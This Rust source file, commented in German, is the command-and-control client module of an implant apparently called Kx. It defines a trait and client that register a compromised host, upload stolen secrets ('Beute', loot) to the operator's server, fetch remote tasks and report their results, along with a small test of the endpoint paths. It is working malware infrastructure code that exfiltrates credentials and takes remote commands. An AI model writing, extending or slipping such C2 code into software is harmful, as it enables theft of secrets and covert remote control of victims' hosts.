//! C2-Kommunikation: Client für den Kx-Server.
//!
//! Der Transport des Protokolls liegt in `kx_core::c2::transport` — dort
//! stehen TLS-Aufbau, Bearer-Header, URL-Bildung und die Abbildung eines
//! HTTP-Status auf einen Fehler. Dieses Modul ist ein dünner Adapter: es
//! bindet die Pfade und die Typen des Protokolls an den Transport.
//!
//! Die Nachrichten selbst sind nicht hier definiert, sondern in
//! `kx_core::c2` — der Agent und der Server sprechen denselben Vertrag.
//!
//! Der Transport ist blockierend: `ureq` wartet auf die Antwort, während der
//! Agent in seiner `async fn` steht. Die Methoden sind deshalb bewusst
//! synchron — ein `async fn` um einen blockierenden Aufruf herum täuscht
//! Parallelität vor, die es nicht gibt.

use kx_core::c2::transport::{Transport, TransportError};
use kx_core::c2::{
    RegisterRequest, SecretUpload, Task, TaskResultRequest, PATH_REGISTER, PATH_SECRETS,
    PATH_TASKS, PATH_TASKS_RESULT,
};

/// Der Seam, an dem der Agent den C2-Server erreicht.
///
/// Zwei Adapter stehen dahinter: die [`C2Client`] im Betrieb und ein
/// Aufzeichner im Test. Der Seam ist die Stelle, an der die Meldelogik —
/// Reihenfolge, Zählung, Verweigerung — ohne laufenden Server prüfbar wird.
///
/// Der Port trägt genau die vier Aufrufe, die der Agent an den C2 richtet:
/// einen Host anmelden, Beute melden, Tasks holen und ein Task-Ergebnis
/// melden. Alles andere — TLS, Header, Statusabbildung — liegt im Transport
/// und bleibt dort.
pub trait C2Port {
    /// Registriert einen Host beim C2-Server.
    ///
    /// Der Host muss dem Server bekannt sein, bevor seine Beute bei ihm
    /// eingeht: eine Beutezeile ohne bekannten Host kann der Operator keinem
    /// Zielhost zuordnen.
    fn registriere_host(&self, req: &RegisterRequest) -> Result<(), TransportError>;

    /// Meldet ein Stück Beute beim C2-Server.
    fn melde_beute(&self, upload: &SecretUpload) -> Result<(), TransportError>;

    /// Holt die offenen Tasks unter `/api/tasks`.
    fn hole_tasks(&self) -> Result<Vec<Task>, TransportError>;

    /// Meldet das Ergebnis eines ausgeführten Tasks unter `/api/tasks/result`.
    fn melde_task_ergebnis(&self, report: &TaskResultRequest) -> Result<(), TransportError>;
}

/// C2-Client — ein Adapter über den Transport aus `kx_core::c2::transport`.
pub struct C2Client {
    transport: Transport,
}

impl C2Client {
    /// Erzeugt einen Client für den angegebenen Server.
    ///
    /// `server_cert`: PEM-Pfad zum Server-Zertifikat (vertraut gemacht).
    pub fn new(server: &str, token: &str, server_cert: &str) -> Result<Self, TransportError> {
        Ok(Self {
            transport: Transport::from_cert_file(server, token, server_cert)?,
        })
    }
}

impl C2Port for C2Client {
    fn registriere_host(&self, req: &RegisterRequest) -> Result<(), TransportError> {
        self.transport.post_json(PATH_REGISTER, req)
    }

    fn melde_beute(&self, upload: &SecretUpload) -> Result<(), TransportError> {
        self.transport.post_json(PATH_SECRETS, upload)
    }

    fn hole_tasks(&self) -> Result<Vec<Task>, TransportError> {
        self.transport.get_json(PATH_TASKS)
    }

    fn melde_task_ergebnis(&self, report: &TaskResultRequest) -> Result<(), TransportError> {
        self.transport.post_json(PATH_TASKS_RESULT, report)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn client_uses_the_contract_paths() {
        assert_eq!(PATH_REGISTER, "/api/register");
        assert_eq!(PATH_SECRETS, "/api/secrets");
        assert_eq!(PATH_TASKS, "/api/tasks");
        assert_eq!(PATH_TASKS_RESULT, "/api/tasks/result");
    }
}
